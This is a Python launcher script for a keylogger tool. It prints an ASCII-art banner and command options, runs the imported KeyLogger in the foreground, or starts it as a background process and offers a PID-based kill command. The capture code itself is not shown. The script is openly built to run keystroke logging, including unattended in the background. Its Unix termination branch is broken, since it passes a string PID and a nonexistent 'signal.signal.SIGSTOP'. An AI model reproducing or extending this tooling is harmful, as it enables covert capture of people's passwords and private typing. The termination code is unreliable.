import subprocess, sys, os, signal, art
from KeyLogger import *

def print_info(err):
    if(err):
        print("\n𝐄𝐑𝐑𝐎𝐑: "+ err)
    print("USAGE: python start.py [OPTIONS]")
    print("\t-s Open visible process of KeyLogger")
    print("\t-b Open background process of KeyLogger")

if __name__ == "__main__":
    print("")
    art.tprint("KeyLogger")
    print("\t\t\t\t\t𝘣𝘺 𝘱𝘦𝘱𝘱𝘦𝘱𝘰𝘭")
    
    if(len(sys.argv) == 2):
        kl = KeyLogger()

        if(sys.argv[1] == "-s"):
            print_info(False)
            print("\n𝐒𝐓𝐀𝐑𝐓 𝐋𝐎𝐆 (PRESS 'esc' to exit)")
            kl.start()

        elif(sys.argv[1] == "-b"):
            pid = subprocess.Popen(["python","KeyLogger.py"]).pid
            print("\n𝐊𝐄𝐘𝐋𝐎𝐆𝐆𝐄𝐑 𝐒𝐓𝐀𝐑𝐓𝐄𝐃 - Use python start.py -k " + str(pid) + " to terminate process")

        else:
            print_info("Options " + sys.argv[1] + " doesn't exists... Retry")
            exit(-1)

    elif(len(sys.argv) == 3):
        
        if(sys.argv[1] == "-k"):
            print_info(False)
            if(os.name == "nt"):
                subprocess.Popen(["TASKKILL", "/PID", sys.argv[2], "/F"])
            else:
                os.kill(sys.argv[2], signal.signal.SIGSTOP)
        else:
            print_info("Options " + sys.argv[1] + " doesn't exists... Retry")
            exit(-1)
    else:
        print_info("Too many arguments")
        exit(-1)